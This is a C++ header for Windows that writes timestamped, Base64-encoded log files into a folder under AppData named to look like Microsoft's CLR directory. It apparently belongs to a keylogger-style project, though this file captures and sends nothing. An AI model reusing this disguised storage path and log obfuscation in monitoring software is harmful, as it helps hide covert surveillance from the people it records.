#ifndef IO_H
#define IO_H

#include <cstdlib>
#include <string>
#include <fstream>
#include "windows.h"
#include "Helper.h"
#include "Base64.h"

namespace IO{
    std::string GetPath(const bool append_seperator = false){
        std::string appdataDir(getenv("APPDATA"));
        std::string fullPath = appdataDir + "\\Microsoft\\CLR";
        return fullPath + (append_seperator ? "\\" : "");
    }

    bool MkSingleDir(std::string path){
        return (bool)CreateDirectory(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
    }

    bool MkDir(std::string path){
        for(auto &c : path){
            if(c == '\\'){
                c = '\0';
                if(!MkSingleDir(path)){
                    return false;
                }
                c = '\\';
            }
        }
        return true;
    }

    template<typename T>
    std::string WriteLog(const T &data){
        std::string path = GetPath(true);
        Helper::DateTime dt;
        std::string name{dt.GetDateTimeString("_") + ".log"};

        try{
            std::ofstream fout(path + name);
            if(!fout)return "";

            std::ostringstream oss;
            oss << "[" << dt.GetDateTimeString() << "]" <<
            std::endl << data << std::endl;
            std::string encryptedData = Base64::EncryptB64(oss.str());
            fout << encryptedData;
            if(!fout)return "";

            fout.close();
            return name;
        }catch(...){
            return "";
        }
    }

}

#endif // IO_H
